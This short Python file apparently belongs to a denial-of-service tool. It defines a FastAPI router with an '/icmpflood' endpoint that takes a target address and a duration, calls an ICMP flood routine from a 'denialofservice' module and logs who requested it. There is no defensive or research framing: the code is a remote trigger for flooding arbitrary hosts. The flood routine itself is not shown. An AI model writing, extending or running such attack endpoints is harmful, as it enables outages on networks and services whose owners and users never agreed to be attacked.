from fastapi import APIRouter, Request
from denialofservice import Layer3
from globals import NUMBER_OF_THREADS
from threading import Thread
from log import log

layer3_router = APIRouter()

@layer3_router.post("/icmpflood")
async def icmp_flood(time: int, target: str, request: Request):
    try:
        Layer3.icmp_flood(target, time)
        log.info(f"{target} ICMP-Flooded from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target} ICMP-Flood from {request.client.host} for {time} seconds could not be triggered")
